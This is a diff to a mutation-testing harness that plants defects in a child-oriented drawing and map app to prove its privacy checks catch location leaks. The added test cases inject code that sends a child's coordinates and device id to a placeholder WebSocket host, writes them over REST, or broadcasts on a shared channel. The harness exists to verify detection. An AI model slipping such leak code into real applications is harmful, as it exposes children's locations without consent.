@@ -150,11 +150,6 @@ plan(7, 'the cap never fires — nothing stops the recorder but a finger', {
 });
 
 /* AND THE REQUIREMENT MUST NOT COLLAPSE INTO ITS BACKSTOP. */
-plan(7, 'the duration cap is derived from the byte cap', {
-  mutate: (s) => sub(s, "var MAX_RECORD_MS = 15000;", "var MAX_RECORD_MS = MAX_INBOUND_BYTES;"),
-  expectText: 'not 15000',
-});
-
 /* §9 — INVARIANT 1. A preset a non-reader cannot identify from its icon is not a preset,
  * and two presets wearing one glyph are one preset painted twice. */
 plan(9, 'two presets are given the same glyph', {
@@ -331,7 +326,7 @@ plan(23, 'the voice panel takes a channel again, under a new name', {
  * make the section red for THAT reason, not for the voice one. */
 plan(23, 'the channel recorder is left unable to fire', {
   mutate: (s) => sub(s, "  cameraChannel = client.channel('puppad-camera', {", "  cameraChannel = ({}) || client.channel('puppad-camera', {"),
-  expectText: 'never fired for a path that DOES take a channel',
+  expectText: 'could not open a channel to piggyback on',
 });
 
 /* §24 — THE MAP LEAK, RESTORED. Real WGS84 beside a stable device id on a global channel:
@@ -355,6 +350,43 @@ plan(24, 'the location marker is removed along with the transport', {
       "    if (mapLocationMarker) mapLocationMarker.setLatLng([lat, lng]);\n    else mapLocationMarker = L.marker([lat, lng], {icon: pawIcon}).addTo(treasureMap);",
       "    if (mapLocationMarker) mapLocationMarker.setLatLng([lat, lng]);"),
   expectText: 'did not track the fix',
+});
+
+/* §24 — THE THREE RE-ADDITIONS THAT WALKED PAST THE WITNESS. Each puts a child's real
+ * coordinates back on the wire by a DIFFERENT mechanism, so no single hook catches all
+ * three, and none of them restores a deleted symbol name — a source grep sees nothing. */
+
+/* (a) A RAW SOCKET. §24 had no socket hook at all: page.on('request') does not fire for
+ * sockets, and §23 restored window.WebSocket in its own last line, so under --only=24 --
+ * which is exactly how this harness runs it -- there was nothing watching. */
+plan(24, 'the stamp path opens a raw WebSocket carrying {lat,lng,did}', {
+  mutate: (s) => sub(s, "      mapStamps.push(stamp);",
+    "      mapStamps.push(stamp);\n      try { var ws = new WebSocket('wss://map-probe.invalid/s?lat=' + stamp.lat + '&lng=' + stamp.lng + '&did=' + deviceId); } catch (e) {}"),
+  expectText: 'WebSocket(s) opened while drawing on the map',
+});
+
+/* (b) A REST WRITE. §24 never set supabaseUrl, so supabaseFetch resolved against '' --
+ * same origin -- and the outbound filter discarded it. */
+plan(24, 'the stamp path writes the coordinates over REST', {
+  mutate: (s) => sub(s, "      mapStamps.push(stamp);",
+    "      mapStamps.push(stamp);\n      try { supabaseFetch('pup_pad_xmarks', 'POST', { lat: stamp.lat, lng: stamp.lng, device_id: deviceId }); } catch (e) {}"),
+  expectText: 'outbound request(s) while drawing on the map',
+});
+
+/* (c) THE SUM. Renaming the branch value is an ORDINARY REFACTOR -- no transport touched --
+ * and it used to make the stamp gesture degrade into a second pen stroke, so 1+1 === 2+0
+ * and the "proved nothing" guard stayed quiet while a live broadcast sat on the stamp
+ * path. Strokes and stamps are counted separately now. */
+plan(24, "the stamp branch is renamed, so the drive silently stops stamping", {
+  mutate: (s) => sub(s, "    if (mapDrawTool === 'stamp') {", "    if (mapDrawTool === 'sticker') {"),
+  expectText: 'the STAMP path was never driven',
+});
+
+/* §23 — the piggyback, now that the arrange opens a channel for it to ride on. */
+plan(23, 'the voice panel broadcasts on the camera channel instead of its own', {
+  mutate: (s) => sub(s, "      if (voiceCapturing()) return;\n      voicePreset = p.id;",
+    "      if (voiceCapturing()) return;\n      try { if (cameraChannel) cameraChannel.send({ type: 'broadcast', event: 'voice-preset', payload: { p: p.id } }); } catch (e) {}\n      voicePreset = p.id;"),
+  expectText: 'SENT 1 broadcast(s) on an existing channel',
 });
 
 console.log(`  ${QUEUE.length} planted defects, run one at a time.\n`);
